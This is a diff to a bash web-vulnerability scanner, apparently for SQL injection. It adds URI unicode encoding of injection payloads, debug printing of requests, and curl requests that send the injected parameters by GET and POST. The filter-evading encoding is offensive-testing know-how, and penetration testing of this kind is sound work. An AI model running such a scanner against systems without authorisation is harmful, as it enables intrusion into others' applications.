@@ -2179,14 +2367,24 @@ cat cleanscannerinputlist.txt | while read i; do
 				if [ true = "$Z" ] ; then echo "DEBUG! y: $y" ; fi
 				if [ true = "$Z" ] ; then echo "DEBUG! paramflag: $paramflag"; fi
 				if (( $y == $paramflag )) ; then 
-					testpayload=$payload
+					#payload=$payload
+					if [ true = "$O" ] ; then #uri unicode encoding
+						if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $payload";fi
+						decodedpayload=$payload						
+						uriinputencode=$payload
+					  	uriunicode
+					  	payload=$uriinputencoded
+						if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $payload";fi
+					fi
+
 					#inject the payload into this parameter:
 					#(the -R path is for REST params:)
 					if [[ true != "$R" ]]; then
-						output=$output`echo ${paramsarray[$y]} | cut -d "=" -f1`"="$testpayload
+						output=$output`echo ${paramsarray[$y]} | cut -d "=" -f1`"="$payload
 					else					
-						output=$output$testpayload
+						output=$output$payload
 					fi
+
 					if [ true = "$Z" ] ; then echo "DEBUG! output after payload injection: $output";fi
 					if [ true = "$Z" ] ; then echo "DEBUG! paramsarray at y: " ${paramsarray[$y]};fi
 					paramtotest=`echo ${paramsarray[$y]} | cut -d "=" -f1`
@@ -2244,6 +2442,12 @@ cat cleanscannerinputlist.txt | while read i; do
 					then asd=1
 
 					cleanoutput=$output
+					
+					if [ true = "$O" ] ; then #uri unicode encoding
+						if [ true = "$Z" ] ; then echo "DEBUG! payload: $payload";fi
+						cleanoutput=`echo $output | replace "$payload" "$decodedpayload" `
+						if [ true = "$Z" ] ; then echo "DEBUG! cleanoutput: $cleanoutput";fi
+					fi
 
 					#encode output and params variables without chaning the variable name
 					encodeinput=$params
@@ -2266,6 +2470,7 @@ cat cleanscannerinputlist.txt | while read i; do
 						r=$uhostname"/"$output
 						i=$uhostname"/"$params
 					fi
+					if [ true = "$Z" ] ; then echo "Output: $output";fi
 					if (( $continueflag == 1 )); then
 						if (( $alreadyscanned == 1 )); then
 							alreadyscanned=0
@@ -2303,6 +2508,7 @@ cat cleanscannerinputlist.txt | while read i; do
 						echo "$method URL: $K/$entries Param ("$((paramflag + 1 ))"/"$arraylength")": $paramtotest "Payload ("$payloadcounter"/"$totalpayloads"): $payload"
 						#send an evil get requst
 						and1eq2=`curl $r -o dumpfile --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
+						if [ true = "$Z" ] ; then echo "Request: $r";fi
 						if [ true = "$Z" ] ; then resp=`echo $and1eq2 | cut -d ":" -f 1`; time=`echo $and1eq2 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
 						# right, thats it for clean and evil GET requests. now POSTs:
 					else	# we're doing a POST - not so simple...
@@ -2314,6 +2520,7 @@ cat cleanscannerinputlist.txt | while read i; do
 							if (($firstPOSTURIURL>0)) ; then
 								if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
 									and1eq1=`curl -d "$static" $uhostname$page"?"$params -o dump --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`
+									if [ true = "$Z" ] ; then echo "Request: $uhostname$page"?"$params"??"$static";fi
 									if [ true = "$Z" ] ; then resp=`echo $and1eq1 | cut -d ":" -f 1`; time=`echo $and1eq1 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
 									#write set sessionStorage to 1 to prevent clean requests being sent for each param:
 									sessionStorage=1
@@ -2323,6 +2530,7 @@ cat cleanscannerinputlist.txt | while read i; do
 								fi
 								if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
 									and1eq1=`curl -d "$params" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}" 2>/dev/null`;
+									if [ true = "$Z" ] ; then echo "Request: $uhostname$page"?"$params";fi
 									if [ true = "$Z" ] ; then resp=`echo $and1eq1 | cut -d ":" -f 1`; time=`echo $and1eq1 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
 									sessionStorage=1
 									echo $sessionStorage > ./session/$safelogname.$safehostname.sessionStorage.txt
@@ -2358,6 +2566,15 @@ cat cleanscannerinputlist.txt | while read i; do
 						fi
 					fi
 					#end of request section
+
+					if [ true = "$O" ] ; then #uri unicode encoding
+						if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $inputbuffer";fi
+						uriinputdecode=$payload
+					  	uriunicode
+					  	payload=$uriinputdecoded
+						if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $inputbuffer";fi
+					fi
+
 					#beginning of response parsing section
                                         if [ true = "$Z" ] ; then echo "DEBUG! Entering response analysis phase";fi 
 					#check the response code and alert the user if its not 200:					
@@ -2422,6 +2639,7 @@ cat cleanscannerinputlist.txt | while read i; do
 					done
 					#end of subsection that scans for common error strings									
 					#beginning of response lenth diffing section
+
 					if [[ "$payload" =~ "345" || "$payload" =~ "dfth" ]]
 						then SQLequallength=`echo $and1eq2 | cut -d ":" -f 2`
 					fi
